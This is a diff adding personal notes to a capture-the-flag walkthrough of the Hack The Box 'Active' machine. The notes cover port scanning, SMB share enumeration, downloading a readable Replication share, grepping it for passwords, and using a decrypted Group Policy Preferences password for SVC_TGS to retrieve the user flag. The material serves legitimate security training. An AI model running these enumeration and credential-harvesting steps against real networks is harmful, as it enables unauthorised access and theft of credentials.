@@ -64,6 +64,8 @@ Host script results:
 
 ```
 
+NB: Message signing enabled and required -> which prevents SMB Relay attacks.
+
 ```
 ls -la /usr/share/nmap/scripts | grep smb2
 ```
@@ -81,10 +83,93 @@ References:
 
     https://msdn.microsoft.com/en-us/library/cc246561.aspx
 
+-> nothing... 
 
-![nmap script1](images/Screenshot_2021-04-20_20-15-14.png)
-![nmap script2](images/Screenshot_2021-04-20_20-14-44.png)
 
+JOKER!
+
+```
+masscan -p1-65535 10.129.144.210 --rate=1000 -e tun0 > ports
+ports=$(cat ports | awk -F  " "  '{print $4}' | awk -F  "/"  '{print $1}' | sort -n | tr  '\n'  ',' | sed 's/,$//') 
+nmap -Pn -sV -sC -p​ $ports​ 10.129.144.210
+```
+
+Nmap reveals an Active Directory installation with a domain of “active.htb”. Microsoft DNS 6.1 is
+running, which allows nmap to fingerprint the domain controller as Windows Server 2008 R2 SP1.
+Port 445 is open and so it is worth running further nmap SMB scripts.
+
+Let's find some nmap scripts to use
+https://nmap.org/book/nse-usage.html
+
+different categories
+auth, broadcast, brute, default. discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln.
+
+safe:
+Scripts which weren't designed to crash services, use large amounts of network bandwidth or other resources, or exploit security holes are categorized as safe. These are less likely to offend remote administrators, though (as with all other Nmap features) we cannot guarantee that they won't ever cause adverse reactions. Most of these perform general network discovery. Examples are ssh-hostkey (retrieves an SSH host key) and html-title (grabs the title from a web page). Scripts in the version category are not categorized by safety, but any other scripts which aren't in safe should be placed in intrusive.
+
+```
+nmap --script safe -p 445 10.129.144.210
+```
+[nmap good](image/Screenshot_2021-05-11_23-04-08-nmap-good.png)  
+
+
+
+
+Enumerate any available file shares
+
+```
+smbclient -L //10.129.144.210 
+```
+
+[smbclient](image/Screenshot_2021-05-11_23-06-39-smbclient.png)  
+
+we can connect on "Replication" is accessible in read for anybody. Seems to be a backup.
+
+```
+smbclient  //10.129.144.210/Replication   
+smb: RECURSE ON
+smb: PROMPT OFF
+smb: mget *
+```
+
+[smb download](image/Screenshot_2021-05-11_23-21-18-smb-download.png)
+
+NB: it's possible to navigate (cd , dir,...) mget directly a file with "mget filename.extension". Don't know why but I need to set Prompt to Off... "y" doesn't work  
+
+it's possible to have shortcut to query and download the groups.xml file directly
+
+```
+smbmap -R Replication -H 10.129.144.210 -A Groups.xml -q
+```
+
+Or it's possible to mount the directory as normal smb
+```
+sudo apt-get install cifs-utils
+mkdir /mnt/Replication
+mount -t cifs //10.129.144.210/Replication /mnt/Replication -o
+username=<username>,password=<password>,domain=active.htb
+grep -R password /mnt/Replication
+```
+-> to find password into Replication
+
+[history of gpp](image/Screenshot_2021-05-11_23-51-27grouppolicy.png)
+
+gpp decrypt password
+[groups.xlm](image/Screenshot_2021-05-11_23-20-43-group.xml.png)
+
+[gpp decrypt](image/Screenshot_2021-05-11_23-20-44-gpp-password-decrypted.png)
+
+
+so the password for SVC_TGS is GPPstillStandingStrong2k18
+
+```
+smbclient -U SVC_TGS //10.129.144.210/Users   
+smb: PROMPT OFF
+cd Users/SVC_TGS/Desktop
+mget user.txt
+```
+
+[flag](image/Screenshot_2021-05-11_23-36-20-dl-flag.png)
 
 #### TCP
 
